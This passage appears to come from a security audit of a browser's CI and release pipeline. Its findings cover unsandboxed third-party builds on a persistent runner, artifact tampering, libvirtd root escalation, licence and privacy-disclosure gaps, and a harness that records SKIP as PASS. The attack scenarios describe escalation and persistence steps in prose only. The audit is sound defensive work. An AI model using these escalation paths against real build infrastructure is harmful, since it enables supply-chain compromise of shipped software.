*Checked at:* .github/workflows/release.yml:169-174 (build-linux itself runs scripts/build-orca.sh on the same Orca pin, before the release-linux upload at 217-228). scripts/build-orca.sh:194-223 (the Orca build steps). powerbrowser/packaging/package-linux.sh:23-33,73 (Orca's out/orcad and out/web ship in the Linux package). Confirming evidence: release.yml:78 (only `build` is exported), 1138-1152 (download by name, release_key check only), 376-382 (windows-orca has no needs edge, same run)

### ci-supply-chain-02: Pinned Orca build code runs unsandboxed on the persistent self-hosted runner legion, outside the release container

- **Severity:** medium (reported as high)
- **Verdict:** CONFIRMED
- **Location:** `.github/workflows/release.yml:174`
- **Category:** supply-chain
- **Owner decision cited:** D-26

**What is wrong.** build-linux runs on legion, a non-ephemeral self-hosted runner (user pb-runner, work dir /var/lib/pb-runner, kept between jobs). The Gecko build runs inside a rootless podman container that is rebuilt every release from a digest-pinned base. The new Orca step instead runs `nix develop .#orca --command bash scripts/build-orca.sh` directly on the host, and that executes Orca's own build scripts. The orca-packaged-tree row then imports orca/src/shared/*.ts on the host (scripts/lib/orca-artifacts.mjs importTs), which also executes Orca code. build-windows on legion fetches Orca and imports the same TypeScript inside the container. The Orca pin advances weekly through bot PRs with auto-merge armed (D-26). Code running as pb-runner persists between jobs and can read the runner's registration credentials in its state directory. It can therefore tamper with every later build-linux output. sign-publish treats that output as data and signs it without checking its content, and sign-windows signs what legion stages. Compromise of legion is therefore equal to compromise of the Linux update channel, and the docs already state it is equal to the Windows signing identity. Threat T-68-SC states that Orca's build runs 'only in the read-only job'. That holds inside the release train but not in release.yml.

**Scenario.** A malicious Orca release, such as a typosquatted dependency added to Orca's pnpm-lock.yaml, is re-pinned and merged. The next release dispatch runs build-orca.sh on legion as pb-runner. The build code installs a persistent hook (for example a modified file under /var/lib/pb-runner, or by taking the runner's .credentials and registering an impostor). Every later release then gets a backdoored tarball or MAR that sign-publish signs and ships to all installed clients.

**Preconditions.** Compromised upstream Orca tag or locked dependency (actor f), merged through the weekly re-pin PR with the owner's approval.

**Evidence.** release.yml:169-174 `- name: Build Orca from source at the pin (orcad, web client) ... bash scripts/fetch-orca.sh\n nix develop .#orca --command bash scripts/build-orca.sh` (host shell), versus release.yml:176-188 where the Gecko build runs in `podman run --rm ... pb-gecko-build`. build-orca.sh:194-223 runs `pnpm run rebuild:node`, `node config/scripts/build-workspace-packages.mjs`, `node mobile/scripts/*.mjs`, `pnpm run build:mobile-web/build:orcad/build:web`. release.yml:212 adds row `orca-packaged-tree`, whose verify-orca-packaged-tree.mjs:211 calls orcaArtifactTables(join(REPO_ROOT,'orca')), and orca-artifacts.mjs:55 `return await import(pathToFileURL(file).href);`. docs/RELEASING.md:47 and 342-346 describe legion as non-ephemeral.

**Suggested fix.** Build Orca for Linux on a GitHub-hosted runner, as windows-orca and the macOS jobs already do, and pass it to build-linux as data admitted by a SHA256SUMS digest output. Alternatively, run build-orca.sh and the orca-packaged-tree import inside the rootless podman container that is rebuilt from the pinned base, with no network after install. Replace the TypeScript import in orca-artifacts.mjs with a parse that does not execute the module, at least wherever it runs on legion.

**Verifier (CONFIRMED, medium).** I traced the code path and it holds. release.yml:169-174 runs `bash scripts/fetch-orca.sh` and then `nix develop .#orca --command bash scripts/build-orca.sh` in the host shell of the build-linux job on legion. Only the Gecko build (release.yml:183-188) and packaging (:199-202) run in `podman run --rm ... pb-gecko-build`. `nix develop` only sets up the environment and does not isolate anything.

build-orca.sh uses `--ignore-scripts` for both installs (:194, :202), so lifecycle scripts are off. It still executes Orca-controlled code and locked-dependency code on the host:
- `node config/scripts/build-workspace-packages.mjs` (:195)
- `pnpm run rebuild:node` (:196), which is a native rebuild
- three `node mobile/scripts/*.mjs` generators (:206-208)
- `pnpm run build:mobile-web`, `build:orcad` and `build:web` (:209-223), which run Orca's package.json scripts and bundler configs

The orca-packaged-tree row (release.yml:212, registered at verify-platform.sh:6788) also runs on the host. It calls `orcaArtifactTables(join(REPO_ROOT,'orca'))` (verify-orca-packaged-tree.mjs:211), and `importTs` does a dynamic `import()` of `orca/src/shared/*.ts` (orca-artifacts.mjs:55), which executes that module's top level.

What reaches this path:
- The pin advances through bot PRs with auto-merge armed (release-train.yml:1059, :1147; D-26).
- The owner's approving review and main-review are the only gates.
- The header of rebase-orca.yml says "This is the only job that runs Orca's code". The `T-68-SC` rows (68-02-PLAN.md:304) say "only in the read-only job". Both are contradicted by release.yml.
- docs/RELEASING.md:342-346 and :1968-1969 confirm legion is non-ephemeral and keeps /var/lib/pb-runner between jobs.
- The pre-job hook (RELEASING.md:381-388) refuses only run shape (ref, event, BASH_ENV and similar). It does not sandbox anything.
- The registration-token file and the MAR key store are stated to be unreadable by pb-runner (RELEASING.md:376-379, :1146). That limits credential exposure but does not block host execution.

Two runtime steps I cannot settle statically:
- whether the runner's own `.credentials` and `.credentials_rsaparams` in its state directory are readable by job processes (this is standard for a same-uid NixOS github-runner);
- which persistence location survives `actions/checkout`'s clean.

Why medium and not high: the precondition is a malicious Orca release or locked dependency merged with the owner's approval. That compromise already backdoors the shipped product on its own, because orcad and the web client built from that code ship in the tarball that sign-publish signs, so a container would not prevent it. What host execution adds is persistence on legion across later releases (after the bad pin is reverted), possible theft of the runner registration credentials, and tampering with what legion stages for sign-windows.

The weakness is not new in kind. Theia's `yarn build` and the `node-gyp rebuild` of drivelist already run on the same host (release.yml:164-166). Orca makes it worse, because a dependency graph that changes weekly now runs on the persistent host. This is a defence-in-depth gap with a concrete path, plus a threat-model statement that is false for release.yml. It is not a boundary an outside attacker can cross without first compromising upstream and getting the owner to merge.

*Checked at:* .github/workflows/release.yml:169-174 (host-shell build-orca.sh, outside the podman container at :183-188); scripts/build-orca.sh:195-223 (Orca build code executed); scripts/lib/orca-artifacts.mjs:55 via scripts/verify-orca-packaged-tree.mjs:211 and release.yml:212 (host import of Orca TS); docs/RELEASING.md:342-346,1968-1969 (non-ephemeral runner); release-train.yml:1059,1147 (auto-merge armed, owner review is the gate); contradicts rebase-orca.yml header and 68-02-PLAN.md:304 T-68-SC

### ci-supply-chain-04: rebase-orca runs untrusted Orca code in the same release-train run as renovate-licensing-publish, so it can replace the notices artifact the bot commits

- **Severity:** medium
- **Verdict:** PLAUSIBLE
- **Location:** `.github/workflows/release-train.yml:1046`
- **Category:** artifact-integrity

**What is wrong.** Plan 51-09 split the Theia licensing regeneration so that no untrusted code shares a context with what the bot publishes. renovate-licensing-publish (bot environment, App token) downloads `renovate-licensing-notices` by name from the current run and commits it to chore/theia-theia. rebase-orca now runs in the same run whenever the Theia tick and the Orca tick fall on the same sweep, or when the owner dispatches with both flags. It executes Orca's install and build with a later actions/upload-artifact step on disk, so the Orca code can obtain ACTIONS_RUNTIME_TOKEN and delete and re-upload any artifact in the run. The same applies to `release-train-maintenance-state`, which the next sweep downloads (prev-run-id) to decide which maintenance rows count as newly red.

**Scenario.** On a sweep that is both the first after the month's last Thursday and the first of an ISO week, the hostile Orca build takes the runtime token. Once renovate-licensing uploads, it replaces renovate-licensing-notices with a LICENSING.md and THIRD-PARTY-NOTICES.txt of its own. The listing check `ls -A == 'LICENSING.md THIRD-PARTY-NOTICES.txt'` passes, and the bot commits the forged notices to the Theia PR. Alternatively, it uploads a release-train-maintenance-state that marks red rows as already red, which suppresses the transition comment for a watchdog failure.

**Preconditions.** Compromised upstream Orca tag (actor f), and a run that includes both the Orca re-pin and the Theia inflow or maintenance sweep.

**Evidence.** release-train.yml:1046-1055 `rebase-orca: ... uses: ./.github/workflows/rebase-orca.yml` (same run); rebase-orca.yml:138 `uses: actions/upload-artifact@...` after the untrusted step at rebase-orca.yml:104-106; release-train.yml:931-936 `Download the regenerated notices ... name: renovate-licensing-notices` with the comment 'This run's artifact only'; release-train.yml:947 checks only the file names; release-train.yml:1944-1946 uploads release-train-maintenance-state, which the next run reads at 1881-1886.

**Suggested fix.** Pass each notices artifact's sha256 as a job output of the producing job (renovate-licensing outputs.head already exists, so add outputs.notices-sha256) and verify it in renovate-licensing-publish before committing. Do the same for maintenance-state. Or run the Orca re-pin as its own workflow (rebase-orca.yml dispatched separately) so no upstream code shares a run with bot-environment consumers.

**Verifier (PLAUSIBLE, medium).** The co-scheduling is real. detect-orca (release-train.yml:1004-1006) and renovate-theia (758-760) both hang off sweep-clock, with orca-due and theia-due computed independently in one sweep (722-750), or set together by owner dispatch flags. rebase-orca is a reusable-workflow job in the same run (1046-1055) with a 90-minute timeout, running Orca's install, build and typecheck on a hosted runner. renovate-licensing-publish downloads `renovate-licensing-notices` by name from the current run (931-936). Its only content check is the file-name listing at 947. It then copies the files into target/ and commits them under the bot identity (960-970) with the App token minted afterwards (973-993). Nothing compares the artifact content with what renovate-licensing produced (for example a digest passed as a job output). The step I cannot settle statically: whether code in a run step of the rebase job can obtain a usable ACTIONS_RUNTIME_TOKEN and use it to delete and re-create an artifact another job in the same run uploaded, before renovate-licensing-publish downloads it. Two routes exist: reading the Runner.Worker process memory or environ (passwordless sudo on hosted runners), or a later node action step in the same job (the upload-artifact at rebase-orca.yml:138 runs only when notices changed). Cross-job deletion inside a run is what upload-artifact's overwrite and merge/delete-merged rely on, so the mechanism is credible. The race window depends on runtime timing. The maintenance-state half is weaker. The report job, which needs rebase-orca (1628), uploads release-train-maintenance-state with overwrite:true (1944-1954) after the rebase job has ended. Tampering with it therefore needs the exfiltrated token to stay valid after its job completes, a second runtime step. Impact is bounded: the forged notices land on chore/theia-theia, where Renovate automerge is off and the owner merges (comment at 756). The suppressed transition comment still leaves the issue body patched red (1922-1929). Medium as a defence-in-depth gap against the plan 51-09 separation stands.

*Checked at:* release-train.yml:722-750 (independent theia/orca ticks), 1046-1055 (same run), 931-936 and 947 (name-only check), 960-970 (bot commit of artifact bytes); rebase-orca.yml:73-76 (contents: read does not scope the runtime token), 104-106, 138; release-train.yml:1628 and 1944-1954 (state upload after rebase-orca ends)

### packaging-prefs-network-01: The release runner user is in libvirtd (root-equivalent on legion), and v1.7 runs Orca's whole from-source build on that persistent runner outside any container

- **Severity:** medium (reported as high)
- **Verdict:** CONFIRMED
- **Location:** `systemd/legion-pb.nix:55`
- **Category:** supply-chain

**What is wrong.** legion-pb.nix puts pb-runner, the user every release.yml job on legion runs as, into the libvirtd group. Read-write access to qemu:///system is root-equivalent: a domain can be defined with host filesystem passthrough or a host block device. The runner is non-ephemeral (ephemeral = false, line 37), and LIBVIRT_DEFAULT_URI=qemu:///system is exported to every job. v1.7 adds a build-linux step that runs `nix develop .#orca --command bash scripts/build-orca.sh` directly on the host, not inside the rootless pb-gecko-build container that Gecko is built in. build-orca.sh installs with --ignore-scripts, but it then runs upstream Orca code and code from the npm closure: config/scripts/*.mjs, vite and esbuild with their plugins, `pnpm run rebuild:node` (node-gyp), and mobile's generator scripts. All of that runs as pb-runner. The pre-job hook keeps out other repos, other workflows and fork PRs. It does nothing against code inside the pinned build inputs.

**Scenario.** Threat (f): an Orca re-pin (rebase-orca or the release-train repin-orca, weekly) takes in a compromised Orca commit, or a lockfile package whose build-time code is malicious (a vite plugin, or a package whose module top level runs when esbuild or vite loads it). On the next release dispatch the build-linux job runs that code as pb-runner on legion. It calls `virsh define` on a domain that mounts / from the host and boots it, which gives root on the owner's workstation. Because the runner is persistent, it can also leave files in /var/lib/pb-runner, .mozbuild/pnpm-store or the corepack cache that alter later release builds. The hosted signer then signs a tampered tarball.

**Preconditions.** A malicious change reaches the pinned Orca commit or its lockfile closure (upstream compromise plus a merged re-pin), and the owner dispatches a release.

**Evidence.** systemd/legion-pb.nix:37 `ephemeral = false;`, :48 `LIBVIRT_DEFAULT_URI = "qemu:///system";`, :55 `extraGroups = [ "libvirtd" ];`. .github/workflows/release.yml:73 `runs-on: [self-hosted, powerbrowser-release]`, :169-174 `bash scripts/fetch-orca.sh` / `nix develop .#orca --command bash scripts/build-orca.sh` (host shell, not podman), unlike :187 where Gecko is built in `podman run ... pb-gecko-build`. scripts/build-orca.sh:195-223 runs build-workspace-packages.mjs, rebuild:node, the mobile generators, build:mobile-web, build:orcad and build:web.

**Suggested fix.** Run the libvirt Windows-matrix jobs as a separate runner user and registration, or switch them to qemu:///session, so the user that builds third-party code has no libvirt socket. Move the Orca build (and the Theia yarn build) into the rootless container the way the Gecko build already runs. Prefer just-in-time ephemeral runner registration so that one job cannot leave state for the next.

**Verifier (CONFIRMED, medium).** I traced every cited step.

1. systemd/legion-pb.nix sets pb-runner as the runner user (:40), `ephemeral = false` (:37), `LIBVIRT_DEFAULT_URI = "qemu:///system"` (:48) and `extraGroups = [ "libvirtd" ]` (:55). It also enables libvirtd (:64).

2. The group grants full access. The NixOS libvirtd module on legion's channel sets `auth_unix_rw = "polkit"` (virtualisation/libvirtd.nix:16). Its polkit rule grants org.libvirt.unix.manage to `subject.isInGroup("libvirtd")` (:639). Management access to qemu:///system is root-equivalent: a domain can pass host paths or host block devices through to the guest.

3. The runner sandbox does not block this. github-runner/service.nix:278-315 sets PrivateUsers, ProtectSystem=strict and NoNewPrivileges, but RestrictAddressFamilies includes AF_UNIX. A read-only mount does not stop connect() on a socket. polkit takes the caller's uid and group membership from the host side, not from the job's user namespace. The file's own comment (:27-28) says socket reachability is unverified. The design intends virsh to work for win-matrix-run.sh, and the comment says to add serviceOverrides if it fails. So "it does not work" would be a bug the owner fixes, not a guard.

4. Orca's build runs on the host, outside the container. release.yml build-linux runs on [self-hosted, powerbrowser-release]. The step "Build Orca from source at the pin" runs `bash scripts/fetch-orca.sh` and then `nix develop .#orca --command bash scripts/build-orca.sh` in the runner's host shell, not inside podman. The Gecko build and the packaging steps do use `podman run ... pb-gecko-build`. scripts/build-orca.sh installs with `--ignore-scripts` (:194, :202) and then runs Orca and closure code as pb-runner: config/scripts/build-workspace-packages.mjs (:195), `pnpm run rebuild:node` (:196), the three mobile generators (:206-208), build:mobile-web, build:orcad and build:web (:209-223).

5. Both cited changes are new in v1.7, according to git history: the libvirtd group in fb9fbddc (59-02) and the build-orca step in 071d6f67 (68-01).

6. The pre-job hook and the main-only/dispatch-only checks filter which repo, workflow and event can run a job. They do nothing about code inside the pinned build inputs.

Why medium rather than high:

- The precondition is hard to arrange: an upstream Orca or npm-closure compromise must land in a re-pin, and the re-pin must merge. release-train.yml:1059/1147 arms auto-merge, but main-review and the owner's approving review remain the gate. Some PRs never get auto-merge at all (:1167-1176).
- The main harm in the scenario follows from the precondition alone, without libvirt. Code that runs in the release build as pb-runner can already tamper with the tarball and leave files in the persistent workDir and caches before the hosted signer signs. The libvirt group adds one thing: root on legion.
- The exposure is not limited to Orca. The Theia step (`yarn build` after `yarn install --ignore-scripts`) also runs npm-closure build code in the host shell as pb-runner. The real gap is libvirtd membership for the user that runs all host-shell build steps, not Orca specifically.

No owner decision in DECISIONS.md accepts this risk. D-26 automates weekly re-pins, which increases how often new closure code arrives.

So: CONFIRMED as a real pb-runner-to-root path with a concrete chain, rated as a defence-in-depth gap given the supply-chain precondition.

*Checked at:* systemd/legion-pb.nix:55 (libvirtd group), :48 (qemu:///system); NixOS virtualisation/libvirtd.nix:16 + :639 (polkit grants manage to libvirtd group); github-runner/service.nix:305-310 (AF_UNIX allowed); .github/workflows/release.yml build-linux step "Build Orca from source at the pin" (host shell, not podman); scripts/build-orca.sh:195-223

### packaging-prefs-network-02: Orca's own MIT copyright and permission notice (Lovecast Inc.) ships nowhere in the package or the notices

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `scripts/generate-licensing.mjs:309`
- **Category:** licensing

**What is wrong.** PowerBrowser ships orcad.js, orcad-server.js and the out/web client, all compiled from Orca's MIT-licensed source. The MIT licence requires its copyright and permission notice in all copies or substantial portions. renderOrcaSection lists only the third-party npm packages found inside the bundles. stage_orca copies only package.json, out/orcad and out/web, so orca/LICENSE is not staged. LICENSING.md says only that Orca's licence is 'checked by inventory/licence-allowlist.json', which is a repository file and not a notice. The pinned orca/package.json has no license field, and no file under orca/out carries the notice.

**Scenario.** A user installs PowerBrowser 153.5.1 with <GreD>/orca. Neither THIRD-PARTY-NOTICES.txt nor anything under <GreD>/orca contains 'Copyright (c) 2026 Lovecast Inc.' or the MIT permission text, so the distribution does not meet the MIT notice condition for the Orca code it redistributes.

**Preconditions.** None; this applies to every v1.7 package.

**Evidence.** scripts/generate-licensing.mjs:309-318 renderOrcaSection pushes ORCA_HEADING, a source line, then only `licenceGroups(packages)` (third-party packages). powerbrowser/packaging/package-linux.sh stage_orca: `cp -a "$1/package.json" ...; cp -a "$1/out/orcad" ...; cp -a "$1/out/web" ...` (no LICENSE). `grep -rn Lovecast` outside orca/ and .planning matches only inventory/licence-allowlist.json; `grep -rlF Lovecast orca/out/orcad orca/out/web` matches nothing. inventory/licence-allowlist.json:46-49 records `holder: Lovecast Inc.` and the licence digest, but nothing renders it.

**Suggested fix.** Render orca/LICENSE verbatim at the head of the Orca section in renderOrcaSection, read from the fetched tree and checked against licence_file_sha256. Also stage orca/LICENSE as <GreD>/orca/LICENSE in all three packaging scripts, and add the Orca root licence to the generate-licensing --check comparison.

**Verifier (CONFIRMED, medium).** renderOrcaSection (scripts/generate-licensing.mjs:308-318) writes the heading, a provenance line, then only licenceGroups(packages), which are the third-party npm packages. The tracked THIRD-PARTY-NOTICES.txt Orca section (line 17965 onward) starts directly with @antfu/install-pkg, and 'Lovecast' appears nowhere in it. stage_orca (powerbrowser/packaging/package-linux.sh:29-35) copies package.json, out/orcad and out/web only, so orca/LICENSE (MIT, 'Copyright (c) 2026 Lovecast Inc.') is never staged. The orca/package.json pin has no license field, and grep -rlF Lovecast over orca/out finds nothing. LICENSING.md:25 only points to inventory/licence-allowlist.json, a repository file that does not ship. That allowlist row (lines 40-50) records holder and digest, but no generator renders it. No guard puts the notice into the package. This is a licence-compliance correctness gap, not a security issue.

*Checked at:* scripts/generate-licensing.mjs:308-318; powerbrowser/packaging/package-linux.sh:29-35; THIRD-PARTY-NOTICES.txt:17965-17975 (no Orca self-notice); orca/LICENSE:1-3; inventory/licence-allowlist.json:46-49

### packaging-prefs-network-03: The privacy page says api.anthropic.com is contacted only after an Anthropic API key is added; v1.7 Orca agents send page and repository content to model providers without one

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `website-staging/privacy.html:77`
- **Category:** privacy-claim
- **Owner decision cited:** D-08

**What is wrong.** The 'Hosts contacted only after you use a feature' list ties api.anthropic.com to the Theia AI chat after the user adds an Anthropic API key, and api.openai.com to an OpenAI key. v1.7 ships a pre-installed Claude Agent SDK extension (ORCA_CLAUDE_AGENT_SDK_DIR points orcad at it), and orcad runs the Claude, Codex and other agent CLIs under the user's own sign-ins. The new 'Orca agents and browser tabs' section says the agent 'can read and act on the pages', but never says that the page contents (and repository files) go to the agent's model provider. The page also omits other hosts v1.7 Orca hosting contacts after a user action: Orca's cloud (*.onorca.dev, on the allowlist through D-08), Google favicons (www.google.com/s2/favicons, then t0-t3.gstatic.com), GitHub avatars, and the provider hosts in orcad-server.js (chatgpt.com, auth.x.ai, api.kimi.com, open.bigmodel.cn, and others).

**Scenario.** A user reads the privacy page, adds no API key, and asks an Orca Claude agent to summarise a web page showing their bank statement in an agent tab. The agent sends the page snapshot to api.anthropic.com under the user's Claude subscription sign-in. The privacy page told them that host is contacted only after they add an Anthropic API key, and gave no warning that agent-read page content leaves the machine.

**Preconditions.** The user runs an Orca agent signed in to a provider.

**Evidence.** website-staging/privacy.html:77 `api.anthropic.com: the AI chat feature, after you add an Anthropic API key and send a request.`; :87 `If you run an Orca agent, it can read and act on the pages in the tabs Orca opened for it.` (no statement about where that content goes). powerbrowser/shell/OrcaEnv.sys.mjs:154-166 claudeAgentSdkDir hands orcad the pre-installed SDK. powerbrowser/endpoint-allowlist.json:144 `.onorca.dev` user-initiated, absent from privacy.html. orca/out/orcad/orcad-server.js contains https://api.anthropic.com, https://chatgpt.com, https://api.openai.com, https://auth.x.ai, https://api.kimi.com.

**Suggested fix.** Add a statement to the Orca section that an agent sends what it reads (page contents, files, terminal output) to the AI provider the user signed the agent into. Reword the api.anthropic.com and api.openai.com lines so they also cover Orca agents. List the Orca cloud hosts and the Google favicon and gstatic hosts under 'contacted only after you use a feature'. Derive that list from the allowlist's user-initiated and user-feature rows so the two cannot drift.

**Verifier (CONFIRMED, medium).** website-staging/privacy.html lists api.anthropic.com only as 'the AI chat feature, after you add an Anthropic API key', under the heading 'contacted only when you use the feature that needs them'. The matching allowlist row (endpoint-allowlist.json api.anthropic.com) has the same @theia/ai-anthropic-only justification. v1.7 hands orcad a pre-installed Claude Agent SDK (OrcaEnv.sys.mjs:153-166, claudeAgentSdkDir, used unless the extension is disabled), and Orca agents run under provider sign-ins, not API keys. The 'Orca agents and browser tabs' paragraph says an agent can read the pages in its tabs, but never says that this content goes to the agent's model provider. The page also leaves out the Orca-feature hosts that the allowlist itself records as user-initiated: .onorca.dev and t0-t3.gstatic.com. Whether a particular agent run reaches api.anthropic.com depends on the user's sign-in. The disclosure gap is static and does not depend on that. This is a privacy-disclosure correctness bug with user-visible effect.

*Checked at:* website-staging/privacy.html (api.anthropic.com bullet; Orca agents paragraph); powerbrowser/shell/OrcaEnv.sys.mjs:153-166; powerbrowser/endpoint-allowlist.json .onorca.dev and t0..t3.gstatic.com rows, absent from privacy.html

### packaging-prefs-network-04: The endpoint allowlist does not cover several hosts Orca hosting contacts, and two 'allow' rows justified by other features silently admit Orca's requests

- **Severity:** medium
- **Verdict:** CONFIRMED
- **Location:** `powerbrowser/endpoint-allowlist.json:211`
- **Category:** egress
- **Owner decision cited:** D-08

**What is wrong.** The allowlist claims to be 'the single machine-readable source of truth for every endpoint this build is allowed to contact'. Two rows hide Orca traffic. www.google.com has disposition allow (unattended) with a Widevine-redirect reason, but Orca's side panel and settings fetch https://www.google.com/s2/favicons?domain=<agent or repo host>. The v1.7 rows themselves say whether launching straight into Orca mode contacts these hosts is an open owner item. Because www.google.com is 'allow', an unattended favicon request to it passes the verdict model. Only the gstatic redirect targets are user-initiated. The same applies to cdn.jsdelivr.net (allow, reason: uBlock filter lists), which also admits Orca's web-client emoji image loads (cdn.jsdelivr.net/npm/emoji-datasource-*). Hosts that the shipped Orca bundles contact on a user action and that have no row at all: huggingface.co (speech model download), storage.googleapis.com (skill install), nodejs.org and unofficial-builds.nodejs.org (orcad remote install), avatars.githubusercontent.com, app.orca.dev (skill share; not under .onorca.dev), linear.app or the Linear API, api.atlassian.com, api.bitbucket.org and dev.azure.com.

**Scenario.** PowerBrowser starts in Orca mode. The Orca sidebar loads its agent icons from www.google.com/s2/favicons?domain=claude.ai&sz=64 before any click, which tells Google which agents the user has and, through repo-icon.ts, the hostnames of the user's repository websites. verify-endpoints passes, because www.google.com is an unattended 'allow' host for Widevine. Separately, a user who turns on speech input triggers a huggingface.co download that the allowlist marks as an unknown-host failure, so the gate's picture of v1.7 egress is incomplete in both directions.

**Preconditions.** Orca mode or its side panel is shown (favicons), or the user uses the named Orca features.

**Evidence.** powerbrowser/endpoint-allowlist.json:211 `"host": "www.google.com", "disposition": "allow"` with reason `part of the same Widevine update-check flow`. The t0..t3.gstatic.com rows: `Whether launching straight into the Orca mode may contact it is an open owner item`. orca/src/renderer/src/lib/agent-catalog.tsx:105 and orca/src/shared/repo-icon.ts:28 build `https://www.google.com/s2/favicons?domain=...`. orca/src/main/speech/model-download-catalog.ts builds huggingface.co URLs. orca/src/main/runtime/runtime-skill-install-commands.ts:84 uses `['https://storage.googleapis.com']`. orca/src/shared/node-runtime-pin.ts names nodejs.org and unofficial-builds.nodejs.org. orca/out/web contains cdn.jsdelivr.net/npm/emoji-datasource-* image URLs.

**Suggested fix.** Give Orca's favicon traffic its own handling. Either route the s2/favicons and emoji image loads through a local placeholder in the overlay, or make the verdict model attribute www.google.com by path or initiator so that an Orca-originated request needs a user action. Add user-initiated rows, with reasons tied to the Orca source, for every host the shipped Orca bundles can reach. Add a static check that extracts hosts from orca/out and compares them with the allowlist both ways.

**Verifier (CONFIRMED, medium).** The verdict rule (scripts/lib/endpoint-verdict.mjs:26) matches on host only. An 'allow' host passes whatever the initiator and whether or not the user acted. www.google.com is 'allow' with a Widevine-redirect reason only, and orca/src/renderer/src/lib/agent-catalog.tsx:105 and orca/src/shared/repo-icon.ts:28 load https://www.google.com/s2/favicons?domain=..., which also appears in the shipped orca/out/web assets. An unattended Orca favicon request to www.google.com therefore cannot fail the gate, and only its gstatic redirect targets are user-initiated. cdn.jsdelivr.net is also 'allow' for uBlock, and emoji-datasource URLs are in out/web (emoji-picker-react, RepositoryIconEmojiPicker). The host list contains no rows for huggingface.co, storage.googleapis.com, nodejs.org, unofficial-builds.nodejs.org, avatars.githubusercontent.com, app.orca.dev, api.atlassian.com, api.bitbucket.org or dev.azure.com, yet each appears in the shipped orcad-server.js or out/web bundles. Absent hosts fail rather than pass, so that half is incompleteness, not masking. One step depends on runtime behaviour: whether favicons load at a startup straight into Orca mode, which the allowlist records as an open owner item. The masking by the 'allow' rows holds statically either way.

*Checked at:* scripts/lib/endpoint-verdict.mjs:26 (host-only verdict); powerbrowser/endpoint-allowlist.json www.google.com and cdn.jsdelivr.net rows ('allow'); orca/src/renderer/src/lib/agent-catalog.tsx:105; orca/src/shared/repo-icon.ts:28; host list has no rows for the named hosts

### harness-driver-01: Driver has no SKIP verdict: a row that prints SKIP and exits 0 is recorded PASS, and --gate reports every check green

- **Severity:** medium (reported as high)
- **Verdict:** CONFIRMED
- **Location:** `scripts/verify-platform.sh:6985`
- **Category:** false-green
- **Owner decision cited:** D-60

**What is wrong.** The run loop decides a row only from the exit status of the row process and the leak leg. It has no SKIP state and does not read the row's output. Every v1.7 live row that guards a security requirement returns 0 after printing 'SKIP --' when one of its preconditions is missing, so the summary prints '<label>: PASS'. run_gate_mode only looks at '<label>: FAIL' lines, so --gate prints 'every registered check is green at this commit' while those rows asserted nothing. The project already treats this as a defect elsewhere: scripts/rebase-orca.sh makes any SKIP line red inside the replay, and WINDOWS 69 records that orca-agent-status-live was counted PASS on a SKIP in gate runs 4 and 5.

**Scenario.** A gate run on a host where theia/node_modules/typescript is missing, where orca/out/orcad/orcad.js was not rebuilt, or where the Claude sign-in expires in under 60 minutes. orca-credential-store-live (credential store) prints 'SKIP -- theia/node_modules/typescript is not installed' and exits 0. no-remote-agent-port-live (D-11) and orca-pairing-containment-live (pairing containment) print SKIP with no built orcad. orca-agent-status-live prints SKIP on the sign-in margin. orca-slotless-start, the permanent re-pin proof, prints SKIP on any host where installedOrcaPaths(orcaDir, homedir()) finds ~/.local/bin/orca-ide or /opt/Orca/orca-ide. Each row is summarised as PASS, and the gate exits 0 with 'PASS' or 'PASS-WITH-EXCLUSIONS'.

**Evidence.** scripts/verify-platform.sh:6975-6990: `setsid $cmd & ... wait "$CURRENT_CHECK_PID" || row_ok=0 ... if [ "$row_ok" -eq 1 ]; then SUMMARY+=("$label: PASS")`. Gate :7066-7067 `extract_failed_labels` greps only `': FAIL$'`, and :7199-7200 prints `--gate PASS -- ... every registered check is green`. Row exits: verify-orca-credential-store-live.mjs:120 `if (!ts) { console.log(`${NAME}: SKIP -- theia/node_modules/typescript is not installed`); return 0; }`; verify-no-remote-agent-port-live.mjs:286 `if (skip) { console.log(`${NAME}: SKIP -- ${skip}`); return 0; }`; verify-orca-pairing-containment.mjs:257 `if (pre.skip) {...; return 0; }`; verify-orca-agent-status-live.mjs:199-200 `const unseeded = seedClaudeLogin(); if (unseeded) return { skip: unseeded };`; verify-orca-slotless-start.mjs:130-131 (installedOrcaPaths default home = os.homedir(), lib/orca-run.mjs:276). Contrast: scripts/rebase-orca.sh:25 `SKIP is red inside the replay`.

**Suggested fix.** Give the driver a SKIP verdict. Have rows exit with a distinct code (for example 3) or print a fixed last line, record '<label>: SKIP', and make --gate fail on any SKIP that is not keyed to an open ledger entry, the same way FAIL exclusions are keyed. Under --gate, turn a missing typescript, a missing orcad build or an installed Orca into a FAIL.

**Verifier (CONFIRMED, medium).** I traced the full path. In run_own_checks (scripts/verify-platform.sh:6974-6991), a bash or node row gets PASS or FAIL from two things only: `wait "$CURRENT_CHECK_PID" || row_ok=0` and the orcad leak leg. The row's stdout is never read, and there is no SKIP state. run_gate_mode (7128-7171) only checks exclusions when rc is non-zero, and it reads failures through extract_failed_labels (7066-7068), which matches only `^  <label>: FAIL$`. With no failures it prints "--gate PASS ... every registered check is green at this commit" (7199-7200). I found no environment variable or strict mode that turns a row's SKIP into a non-zero exit. I checked every cited row exit:
- verify-orca-credential-store-live.mjs:120 prints SKIP and returns 0 when typescript is missing. Lines 116-117 do the same with no built PowerBrowser or no orcad.js.
- verify-no-remote-agent-port-live.mjs:286 prints SKIP and returns 0.
- verify-orca-pairing-containment.mjs:257 prints SKIP and returns 0 on pre.skip.
- verify-orca-agent-status-live.mjs:196-200 returns {skip} on a missing build, a missing claude, or an unseeded sign-in. At 395, code stays 0.
- verify-orca-slotless-start.mjs:179 returns 0 on skipReason. scripts/lib/orca-run.mjs:125-133 includes the installed-Orca case, using installedOrcaPaths with home = homedir() (orca-run.mjs:276). Neither path exists on this host now.

The contrast the finding draws is real. rebase-orca.sh:25-28 treats any SKIP line as red in the replay. WINDOWS.md entry 69, still open, records that orca-agent-status-live was counted PASS on a SKIP in gate runs 4 and 5, so TERM-02's real-agent leg did not run in those gates. This has happened in practice.

I lowered the severity from high to medium for two reasons:
1. The rows still go red when their preconditions hold, so they are not checks that can never go red.
2. The input is host or build state, not something an attacker controls.

The effect is a defence-in-depth gap in the harness: --gate can claim every check is green while several security rows asserted nothing. Skip-and-pass on absent trees is a documented convention in the registry comments (for example 4754 and 4824), but no owner decision accepts it for the --gate green claim. WINDOWS 69 records the agent-status case as an open issue, not as an accepted risk.

